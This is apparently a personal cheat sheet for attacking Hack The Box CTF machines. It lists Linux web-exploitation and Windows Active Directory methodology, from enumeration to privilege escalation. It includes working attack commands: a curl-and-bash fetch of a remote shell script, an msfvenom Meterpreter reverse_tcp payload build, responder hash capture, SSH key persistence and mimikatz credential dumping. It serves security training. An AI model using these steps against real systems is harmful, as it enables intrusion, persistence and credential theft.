# CTF Guide for Forgetful Persons on HTB

## Linux
When going after Linux boxes on HTB the trend revolves around web exploitation.<br>
For help in automation Python is going to be your best-a-friend!<br>

### When viewing websites:
- Interact with every form, button, url, anything interactable
- Track emails for safe-keeping
- Run subdomain scans to kind hidden subdomains
   * Even if a subdomain name seems unlikely, add it and try accessing it!
- Gobuster to enumerate the website pages for panels: dashboard, admin, etc
- Gobuster to enumerate a websites possible API
- Use burpsuite to view headers to determine the technology behind the site
- Read source code, 404 Error messages, anything the site shows that can be meta-data
- Track Services and Technologies the sites are using, including version IDs, and other data
- Attempt SQLI on login prompts and attempt default credentials like `admin:admin`
- Attempt to understand as best as you can how the website works behind the scenes
- Google as much as you can, change the wording if needed to find what you need
- Find a way to possibly dump the website source code if possible
    * The source code can allow you to understand the backend thus giving you the ability to find a vuln
- List the usernames that are possible to attempt logging into
- HackTricks has lots of goodies on how to abuse things!
- Inspect Burpsuites request history
- Look at Inspector Modes Network to see Resources Loaded on Refresh
- Use FFUF for any fuzzing job its a very useful tool!

### Side Portions:
- You may need to perform phishing attacks, `swaks` is a useful phishing command
- Binary exploiting can occur sometimes, bin-exploiting can sometimes be painful
- Incase youre dealing with domains where maybe you have password-resets being sent or various other sensitive data,<br>
it does not hurt to look into the DNS services being used incase you can perform a takeover to Man-in-the-Middle capture sensitive data
- MITM Attacks are useful when you know for certain data is being sent from point A -> B and you're able to get in between<br>
the connection and feed the data through yourself : `A -> YOU -> B`
- Try many types of payloads concerning LFI, Bypasses, etc. Sometimes Blacklists can be also bypassed

### You have Credentials?:
- Try them everywhere, you'd be surprised how common credential sharing is!
- Hashes need cracked! Use `hashcat` or `johntheripper`, if the credential fails switch which tool youre using

### Investigate the possiblities of Attempting:
- LFI (Local File Inclusion)
- XSS (Cross-Site Scripting)
- Bypasses in File-Upload to gain PHP Web RCE Capabilities
- RCE (Remote Code Execution)
- SSRF (Server-Side Request Forgery)
- SQLI (SQL Injection)
- CSRF (Cross-Site Request Forgery)
- JWT Forging
    * JWT.io can help modify cookies once you find the `SECRET`
- Cookie Stealing
    * Lots of times using JavaScript is needed
- Request Redirection
    * Use burpsuite to modify/inspect requests
- Sometimes a single wordlist isn't going to work try using multiple wordlists!

### Setting up reverse shells:
- Review the technology youre using the execute shell code
- Sometimes sending payloads at once can fail, always try staging the shell
    * `curl http://ip/shell.sh -o /tmp/shell.sh` then `bash /tmp/shell.sh`
- There are many kinds of shells you can summon
    * [Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
    * [Reverse Shell Online](https://www.revshells.com/)

### When you recieve your Reverse Shell or SSH Connection:
- Harden the reverse shell
    * `stty raw -echo; fg`
    * *hit enter twice on the shell terminal*
    * `stty -a` to see the rows and cols to then run
    * `stty rows # cols #`
- If you gain a reverse shell as a user with a /home directory add a SSH key to switch to a nicer SSH terminal
    * ssh-keygen *use defaults on prompts*
    * mv the /home/user/.ssh/id_rsa.pub into /home/user/.ssh/authorized\_keys
    * copy the id_rsa into your local pwd and `chmod 600 user_id_rsa.key` this allows you to run `ssh user@ip -i user_id_rsa.key`
- Use [linpeas.sh](https://github.com/peass-ng/PEASS-ng) for enumeration
- Check for vulnerable SUID
- Check sudo privillieges
- Chisel ports to find external apps/sites being ran by higher priv users
- Ligolo for pivoting around networks
- For all files you can run with `sudo` try to see if you can read the content
    * run `file` against the filepath chances are you will be able to read this to try finding vulns
    * cross check strange pieces of source code, they can possibly be exploited for escalating
- Google as much as you can, change the wording if needed to find what you need
- Check the kernel `uname -r` maybe youre lucky and you can use a simple kernel priv esc
- Try to dig into website source code
    * Finding configs can leak out credentials for SSH or databases where credential hashes are stored
- It sounds stupid but check the environment vars for bread-crumbs: `env`
- Try to enter other users home directories, some users you shell in as may be able to view places you don't expect
- Check around nearby directories, it is easy to deer vision one when the data you seek is right behind you
- View for hidden files or directories `ls -a` hidden items start with a `.`, such as `.ssh` like shown above!
- Don't be shy, attempt to edit files if youre in either a harden shell or SSH connection, maybe you'll get lucky!

## Windows
Windows is an evil OS, it's full of crud that makes hacking it a pain, don't fret too much if you struggle.<br>
Windows has a lot of direction it can go, Active Directory, LDAP, SMB, Web, etc.<br>

### What do I try?
- Always nmap, you want to know all ports to see what services you can be facing soon
- `crackmapexec` is a great tool for messing with various windows protocols like SMB
    * try default creds such as: `guest:[nopass]`, `anonymous:[nopass]`, `[nopass]:[nopass]`
- SYNC YOUR CLOCK, services such as Kerberos discriminates time, if your clock isnt synced it refuses to do business
    * I have a script that [helps sync clocks](https://github.com/EndermanSUPREME/myKali_Scripts/blob/main/clocksync.sh)
- Try credentials everywhere if you have them!
- Just like Linux boxes ENUMERATE and analyse websites and their components
- Attempt kerberoasting, maybe some accounts don't use pre-auth so you can get a hash or two
- Use responder to capture NTLMv2 hashes to crack into working passwords
    * SMB calls look like `\\IP\fakeShare`
    * responder needs sudo privs: `sudo responder -I tun0`
    * HTB uses tun0 as the interface we communicate through
- When getting a shell using the normal `nc` listener is cool, but once you go `Meterpreter` you don't wanna go back!
    * `msfvenom` is used to build various shells : `msfvenom -p windows/x64/meterpreter/reverse_tcp -LHOST [IP] -LPORT [PORT] -f exe -o meter.exe`
    * msfvenom can also produce byte code as well, but I don't suggest to use it unless you know what you're doing
    * Meterpreter listeners run off wonder `msfconsole`
        * use exploit/multi/handler is the shell handle module
        * when using that module ensure you set these params: { LHOST, LPORT, PAYLOAD : (must match the options set in msfvenom) }
- Kali is super cool with the `Impacket-Scripts` there are a bunch of these designed to help exploit Windows Protocols
- With credentials you can possibly shell inside the system, try running `evil-winrm`
- Sometimes in CTFs you don't encounter it much, watch for `LDAP Injections` they can help get into logins or dump creds
- Add any probable subdomain you find, all info you can gather is a big help!

### SMB looks interesting?:
- Use `crackmapexec` to help interact using credentials
- Use Impacket to possibly exploit/enumerate users

### Kerb is Roasting me!:
- TGTs can be very valuable, and the service can be intimidating, don't worry!
    * Tools such as Impacket, Rubeus, etc can help relieve the pressure!
- HackTricks has lots of information on TGTs!

### Holy Cow I got a SHELL!
- GET YOURSELF A METERPRETER SHELL (trust me, it makes life easier)
- Ensure the shell youre running is using PowerShell!
- Download tools!
    * [winpeasany.exe](https://github.com/peass-ng/PEASS-ng) this helps enumerate Windows System information!
    * [SharpHound.exe](https://github.com/BloodHoundAD/SharpHound) Windows LUVZ Active Directory, this will help<br>
    enumerate this for passing to BloodHound locally : `SharpHounds computers.json breaks bloodhound so don't import it!`
    * [runascs.exe](https://github.com/antonioCoco/RunasCs) with credentials you can easily get reverse shells from your current reverse shell!
    * [powerview.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) this opens up many helpful cmdlets
    * [MIMIKATZ](https://github.com/ParrotSec/mimikatz) keep this under youre belt, with high enough privillieges you can<br>
    dump helpful things like NTLM hashes for evil-winrm, credentials for runascs.exe, etc
    * Maybe using [Full Powers](https://github.com/itm4n/FullPowers) will let you use cool privillieges
    * Try the [Potatoes](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer) they can have magical pwning power!
- Attack Active Directory
    * Some Accounts you have access to from pwning may have dangerous privs, bloodhound can help explain what the vuln is and<br>
    how to abuse it, but do try to research what you're doing so you understand what it is you're doing it helps a lot!
    * Lots of times from AD this is how you horizontally move to higher priv users when on the route to pwning Administrator or NT System
    * `Import-Module .\powerview.ps1; Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "USER"}`<br>
    this command can sometimes do BloodHounds heavy lifting for you to better exposes vulns, but use all the tools at your disposal!
- Try to enter other users home directories, some users you shell in as may be able to view places you don't expect
- Downloads and Inspect as much as you can concerning strange files
- View around the File System, mark down any strange directories found. May come in handy later!
- HackTricks has lots of goodies on how to abuse things!
- Check the `whoami /priv` if you see `SetImpersonate` this is a dangerous priv! Try using potato priv-escs or even PowerUp!

### I am stuck with my Shell:
- You may be using Kali to attack Windows, but this doesn't mean you can use Windows against itself!
    * With research you can find ways to use on-board powershell commands to exploit services
- Finding Secrets!
    * Impacket can help using `impacket-dumpsecrets`
    * mimikatz.exe can dump more than secrets, we can dump SAM (Account Management), and more!
    * Did you overlook the File System? Check incase you're overlooking a file or directory
